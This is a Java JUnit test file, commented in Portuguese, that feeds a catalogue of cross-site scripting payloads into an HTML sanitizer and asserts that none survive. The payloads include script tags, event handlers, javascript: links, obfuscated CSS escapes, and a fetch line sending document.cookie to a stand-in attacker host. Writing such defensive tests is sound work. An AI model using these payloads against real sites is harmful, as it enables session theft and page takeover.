package com.socialcoisa.rede.shared.html;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.List;

import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;

/**
 * Bateria de ataques contra a pagina publicada.
 *
 * A garantia de verdade e o quadro do front (sandbox sem script, sem mesma origem, com CSP), que o
 * teste de bancada no Chrome confirma. Mas a limpeza na GRAVACAO e a outra barreira: o que fica
 * guardado e lido por app, e-mail e crawler — caminhos onde nao existe iframe para proteger. Estes
 * casos existem para que uma regressao na allowlist seja pega por teste, e nao por um usuario.
 *
 * Nenhum payload aqui pode sobreviver: nem tag executavel, nem atributo de evento, nem esquema
 * `javascript:`, nem markup formado por entidade HTML.
 */
@Tag("critico")
class SafeHtmlAttackTests {

	/** Cada linha e um ataque classico; o resultado nao pode conter nada disso. */
	private static final List<String> PAYLOADS = List.of(
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)></svg>",
		"<svg><script>alert(1)</script></svg>",
		"<math><mtext><script>alert(1)</script></mtext></math>",
		"<body onload=alert(1)>",
		"<div onmouseover=alert(1)>texto</div>",
		"<a href=\"javascript:alert(1)\">clique</a>",
		"<a href=\"  JaVaScRiPt:alert(1)\">clique</a>",
		"<a href=\"data:text/html,<script>alert(1)</script>\">clique</a>",
		"<img src=\"javascript:alert(1)\">",
		"<style>@import url(\"https://malicioso.test/x.css\");</style><p>ok</p>",
		"<style>div{width:expression(alert(1))}</style><p>ok</p>",
		"<style>div{background:url(javascript:alert(1))}</style><p>ok</p>",
		"<p style=\"background:url('javascript:alert(1)')\">ok</p>",
		"<link rel=\"stylesheet\" href=\"https://malicioso.test/x.css\">",
		"<meta http-equiv=\"refresh\" content=\"0;url=https://malicioso.test\">",
		"<base href=\"https://malicioso.test/\">",
		"<form action=\"https://malicioso.test\"><input name=senha></form>",
		"<object data=\"https://malicioso.test/x.swf\"></object>",
		"<embed src=\"https://malicioso.test/x.swf\">",
		"<iframe src=\"https://malicioso.test\"></iframe>",
		"<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
		"<p>texto</p><script>fetch('https://malicioso.test/'+document.cookie)</script>",
		"<img src=x onerror=\"parent.document.body.innerHTML='tomado'\">",
		"</style><script>alert(1)</script><p>ok</p>",
		"<div style=\"position:fixed;inset:0;background:url(https://malicioso.test/pixel)\">capa</div>",
		// CSS escapes and comments spelling a forbidden name.
		"<style>div{background:\\75rl(https://malicioso.test/x)}</style><p>ok</p>",
		"<style>div{background:\\u\\r\\l(https://malicioso.test/x)}</style><p>ok</p>",
		"<p style=\"background:\\000075\\72 \\6c(https://malicioso.test/p)\">ok</p>",
		"<style>@\\69mport \"https://malicioso.test/x.css\";</style><p>ok</p>",
		"<style>div{width:expr/**/ession(alert(1))}</style><p>ok</p>",
		"<style>div{width:\\65xpression(alert(1))}</style><p>ok</p>",
		"<style>div{background:image-set(\"https://malicioso.test/x.png\" 1x)}</style><p>ok</p>"
	);

	@Test
	void noPayloadSurvivesSanitization() {
		for (String payload : PAYLOADS) {
			String clean = SafeHtml.sanitizePageHtml(payload);

			String checked = clean == null ? "" : clean.toLowerCase();
			assertThat(checked.contains("<script")).as("script em: %s", payload).isFalse();
			// Quadro de host DESCONHECIDO continua proibido; embed de provedor conhecido e permitido
			// por desenho (o player roda dentro da pagina, e a pagina vive em origem separada).
			assertThat(checked.contains("<iframe") && !checked.contains("youtube") && !checked.contains("vimeo"))
				.as("quadro de host desconhecido em: %s", payload).isFalse();
			assertThat(checked.contains("<object") || checked.contains("<embed")).as("plugin em: %s", payload)
				.isFalse();
			assertThat(checked.contains("<form") || checked.contains("<input")).as("formulario em: %s", payload)
				.isFalse();
			assertThat(checked.contains("<meta") || checked.contains("<base") || checked.contains("<link"))
				.as("cabeca injetada em: %s", payload).isFalse();
			assertThat(checked.contains("javascript:")).as("esquema javascript em: %s", payload).isFalse();
			assertThat(checked.contains("malicioso.test")).as("host do ataque em: %s", payload).isFalse();
			assertThat(checked.contains("alert(")).as("chamada de alerta em: %s", payload).isFalse();
			assertThat(checked.matches("(?s).*\\son[a-z]+\\s*=.*")).as("atributo de evento em: %s", payload).isFalse();
			assertThat(checked.contains("@import") || checked.contains("expression("))
				.as("css perigoso em: %s", payload).isFalse();
		}
	}

	/** Escapes that do not spell a name (quotes in `content`) stay as the author wrote them. */
	@Test
	void keepsNonNameCssEscapes() {
		String clean = SafeHtml.sanitizePageHtml("<style>q::before{content:\"\\201C\"}</style><q>ok</q>");

		assertThat(clean).contains("content:\"\\201C\"");
	}

	/** Links: alvo e `rel` sao definidos por nos; o autor nao escolhe navegar a aba de cima. */
	@Test
	void linksGetControlledTargetAndRel() {
		String clean = SafeHtml.sanitizePageHtml(
			"<a href=\"https://exemplo.com\" target=\"_top\" rel=\"opener\">site</a>");

		assertThat(clean).contains("target=\"_blank\"");
		assertThat(clean).contains("rel=\"noopener noreferrer\"");
		assertThat(clean).doesNotContain("_top").doesNotContain("rel=\"opener\"");
	}

	/** Texto normal continua passando inteiro: a limpeza nao pode virar censura de conteudo. */
	@Test
	void ordinaryContentSurvives() {
		String clean = SafeHtml.sanitizePageHtml("""
			<h1>Meu portfólio</h1>
			<p>Escrevo sobre <em>arquitetura</em> e <strong>sistemas distribuídos</strong>.</p>
			<ul><li>Java</li><li>Kotlin</li></ul>
			<figure><img src="https://exemplo.com/foto.jpg" alt="foto"></figure>
			<p><a href="https://exemplo.com/blog">Meu blog</a></p>
			""");

		assertThat(clean).contains("Meu portfólio").contains("<li>Java</li>").contains("Meu blog");
		assertThat(clean).contains("href=\"https://exemplo.com/blog\"");
	}
}
